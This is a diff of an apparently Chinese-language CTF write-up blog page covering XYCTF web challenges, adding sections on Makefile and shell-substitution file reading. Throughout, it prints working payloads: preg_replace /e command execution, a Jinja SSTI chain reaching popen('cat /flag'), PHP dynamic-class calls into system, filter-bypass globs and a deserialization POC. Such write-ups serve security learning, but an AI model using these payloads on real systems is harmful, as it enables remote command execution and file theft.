@@ -25,7 +25,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="file:///C:/Users/17492/AppData/Roaming/Tencent/Users/1749281956/QQ/WinTemp/RichOle/1OI%60Q%7DKDBNNW$]BOA~F941C.png">
 <meta property="article:published_time" content="2024-04-14T14:31:07.000Z">
-<meta property="article:modified_time" content="2024-04-27T09:29:41.459Z">
+<meta property="article:modified_time" content="2024-05-02T15:20:05.442Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="file:///C:/Users/17492/AppData/Roaming/Tencent/Users/1749281956/QQ/WinTemp/RichOle/1OI%60Q%7DKDBNNW$]BOA~F941C.png">
@@ -221,7 +221,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.1k words
+          2.4k words
         
       </span>
     
@@ -232,7 +232,7 @@
         
         
         
-          18 mins
+          21 mins
         
       </span>
     
@@ -283,8 +283,16 @@
 
 <p><strong>payload：val1&#x3D;240610708&amp;val2&#x3D;s878926199a&amp;md5&#x3D;0e215962017&amp;XY&#x3D;QNKCDZO&amp;XYCTF&#x3D;QNKCDZO</strong><br>显示 LLeeevvveeelll222.php&#x3D;&#x3D;&gt; 打开<br><code>if (isset($_POST[&#39;a&#39;]) &amp;&amp; !preg_match(&#39;/[0-9]/&#39;, $_POST[&#39;a&#39;]) &amp;&amp; intval($_POST[&#39;a&#39;])) &#123;  echo &quot;操作你O.o&quot;;  echo preg_replace($_GET[&#39;a&#39;],$_GET[&#39;b&#39;],$_GET[&#39;c&#39;]);</code></p>
 <p>POST_a用数组绕过+++++e模式<br><strong>payload：?a&#x3D;&#x2F;a&#x2F;e&amp;b&#x3D;system(‘cat &#x2F;flag’)&amp;c&#x3D;&#x2F;a&#x2F;e————POST: a[]&#x3D;1</strong><br><em>OVER</em></p>
+<h2 id="ezMake-命令执行绕过-shell变量替换符读文件"><a href="#ezMake-命令执行绕过-shell变量替换符读文件" class="headerlink" title="ezMake(命令执行绕过+shell变量替换符读文件 )"></a>ezMake(命令执行绕过+shell变量替换符读文件 )</h2><p><strong>利用shell变量替换符$(&lt;file)读文件</strong></p>
+<p>直接echo $(&lt;flag)</p>
+<p>发现不行</p>
+<p>试试echo $$(&lt;&#x2F;flag)可行</p>
+<h2 id="ez-Make-读文件-文件名过滤"><a href="#ez-Make-读文件-文件名过滤" class="headerlink" title="ez?Make(读文件+文件名过滤)"></a>ez?Make(读文件+文件名过滤)</h2><p>通过shell正则匹配到flag文件,用more读取(大概禁了f,l,a,g ,&#x2F;字符)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cd .. &amp;&amp;cd .. &amp;&amp;cd .. &amp;&amp;more [^e][^b][^b][^b]<br></code></pre></td></tr></table></figure>
+
+<h2 id="εZ-¿м-Kε¿-报错读文件-makefile自动变量"><a href="#εZ-¿м-Kε¿-报错读文件-makefile自动变量" class="headerlink" title="εZ?¿м@Kε¿?(报错读文件+makefile自动变量)"></a>εZ?¿м@Kε¿?(报错读文件+makefile自动变量)</h2><p>Makefile 自动变量<br>在Makefile中，大家经常会见到类似@ 、 @、@、^、$&lt;这种类型的变量。这种变量一般称为自动变量，自动变量是局部变量，作用域范围在当前的规则内，它们分别代表不同的含义：<br>$@：目标<br>$^：所有目标依赖<br>$&lt;：目标依赖列表中的第一个依赖<br>? ：所有目标依赖中被修改过的文件这里第一个依赖是就是 &#x2F; f l a g 注意&#x3D;&#x3D;坑点&#x3D;&#x3D;，之前不要试?：所有目标依赖中被修改过的文件这里第一个依赖是就是&#x2F;flag(注意&#x3D;&#x3D;坑点&#x3D;&#x3D;，之前不要试&gt;，会导致重定向输出创建新文件了，直接影响了后续判断为依赖是FLAG,卡了半天读不到&#x2F;flag)</p>
 <h2 id="easymd5-文件比较"><a href="#easymd5-文件比较" class="headerlink" title="easymd5(文件比较)"></a>easymd5(文件比较)</h2><p>将JPG文件甩在工具fastcoll上<br>生成2个文件<br><em>OVER</em></p>
-<h2 id="说英文的复读机"><a href="#说英文的复读机" class="headerlink" title="说英文的复读机"></a>说英文的复读机</h2><p>1.抓包爆破&#x3D;&#x3D;&gt;密码：asdqwe<br>2.fuzz&#x3D;&gt;发现SSTI</p>
+<h2 id="说英文的复读-机弱密码-SSTI的简单绕过-requests"><a href="#说英文的复读-机弱密码-SSTI的简单绕过-requests" class="headerlink" title="说英文的复读(机弱密码+SSTI的简单绕过(requests))"></a>说英文的复读(机弱密码+SSTI的简单绕过(requests))</h2><p>1.抓包爆破&#x3D;&#x3D;&gt;密码：asdqwe<br>2.fuzz&#x3D;&gt;发现SSTI</p>
 <p>requests,args,.没有过滤</p>
 <p>直接<code>requests</code>绕过关键词过滤<code>|attr()</code>绕过<code>[]</code>过滤</p>
 <p>?sentence&#x3D;(()|attr(request.values.a)|attr(request.values.b)|attr(request.values.c)()|attr(request.values.d)(132)|attr(request.values.e)|attr(request.values.f)|attr(request.values.d)(request.values.g)(request.values.h)).read()啊啊&amp;a&#x3D;<strong>class</strong>&amp;b&#x3D;<strong>base</strong>&amp;c&#x3D;<strong>subclasses</strong>&amp;d&#x3D;<strong>getitem</strong>&amp;e&#x3D;<strong>init</strong>&amp;f&#x3D;<strong>globals</strong>&amp;g&#x3D;popen&amp;h&#x3D;cat &#x2F;flag</p>
@@ -306,7 +314,7 @@
 <h2 id="ezClass"><a href="#ezClass" class="headerlink" title="ezClass"></a>ezClass</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);  <br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];  <br><span class="hljs-variable">$aa</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aa&#x27;</span>];  <br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];  <br><span class="hljs-variable">$bb</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;bb&#x27;</span>];  <br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];  <br>((<span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$aa</span>))-&gt;<span class="hljs-variable">$c</span>())((<span class="hljs-keyword">new</span> <span class="hljs-variable">$b</span>(<span class="hljs-variable">$bb</span>))-&gt;<span class="hljs-variable">$c</span>());<br></code></pre></td></tr></table></figure>
 
 <p>结构 new 一个类(参数)-&gt;执行方法<br> 利用Error类的静态方法 getMessage返回任意字符结合php的动态执行特性</p>
-<p>?a&#x3D;Error&amp;aa&#x3D;system&amp;b&#x3D;Error&amp;bb&#x3D;cat &#x2F;f*&amp;c&#x3D;getMessage</p>
+<p>?a&#x3D;Error&amp;aa&#x3D;system&amp;b&#x3D;Error&amp;bb&#x3D;cat &#x2F;flag&amp;c&#x3D;getMessage</p>
 <h2 id="ezSerialize"><a href="#ezSerialize" class="headerlink" title="ezSerialize"></a>ezSerialize</h2><p>构造POC</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span> </span>&#123;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>​    <span class="hljs-variable language_">$this</span>-&gt;token=&amp;<span class="hljs-variable language_">$this</span>-&gt;password;<br><br>​    <span class="hljs-variable language_">$this</span>-&gt;password =<span class="hljs-number">1</span>;<br><br>  &#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>
 
